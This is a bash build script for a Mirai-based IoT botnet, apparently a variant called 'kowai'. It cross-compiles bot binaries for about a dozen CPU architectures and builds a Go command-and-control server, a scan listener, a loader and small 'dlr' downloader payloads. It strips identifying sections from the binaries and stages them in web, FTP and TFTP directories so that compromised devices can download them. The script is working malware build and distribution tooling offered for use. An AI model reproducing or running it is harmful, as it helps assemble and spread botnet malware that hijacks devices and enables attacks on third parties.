#!/bin/bash

# Add cross-compilers to PATH
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

# Go environment setup
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# Get Go dependencies
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

# Patch memset issue in C source
sed -i '1i#include <string.h>' bot/attack_method.c

# Compile function
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

# Cleanup and prepare dirs
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html /var/lib/tftpboot /var/ftp
mkdir -p /var/ftp /var/lib/tftpboot /var/www/html/bins

# Build Go components
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv loader/cnc ~/
go build -o loader/scanListen scanListen.go

# Compile bot binaries
FLAGS="-DUSEDOMAIN"
compile_bot i586 kowai.x86 "-static $FLAGS"
compile_bot mips kowai.mips "-static $FLAGS"
compile_bot mipsel kowai.mpsl "-static $FLAGS"
compile_bot armv4l kowai.arm "-static $FLAGS"
compile_bot armv5l kowai.arm5 "-static $FLAGS"
compile_bot armv6l kowai.arm6 "-static $FLAGS"
compile_bot armv7l kowai.arm7 "-static $FLAGS"
compile_bot powerpc kowai.ppc "-static $FLAGS"
compile_bot sparc kowai.spc "-static $FLAGS"
compile_bot m68k kowai.m68k "-static $FLAGS"
compile_bot sh4 kowai.sh4 "-static $FLAGS"

# Copy binaries to different directories
cp release/kowai.* /var/www/html/bins
cp release/kowai.* /var/ftp
mv release/kowai.* /var/lib/tftpboot
rm -rf release

# Build loader
gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

# Make sure dlr output directory exists
mkdir -p ~/dlr/release

# Compile dlr payloads for multiple archs
armv4l-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc   -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc   -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc   -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc    -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc  -Os -static ~/dlr/main.c -o ~/dlr/release/dlr.spc

# Strip unnecessary sections
for arch in arm arm5 arm6 arm7 x86 m68k mips mpsl ppc sh4 spc; do
    ${arch//x86/i586}-strip -S --strip-unneeded \
        --remove-section=.note.gnu.gold-version \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        --remove-section=.note.ABI-tag \
        --remove-section=.jcr \
        --remove-section=.got.plt \
        --remove-section=.eh_frame \
        --remove-section=.eh_frame_ptr \
        --remove-section=.eh_frame_hdr ~/dlr/release/dlr.$arch 2>/dev/null
done

# Move all to final bin dir
mkdir -p ~/loader/bins
mv ~/dlr/release/dlr* ~/loader/bins 2>/dev/null
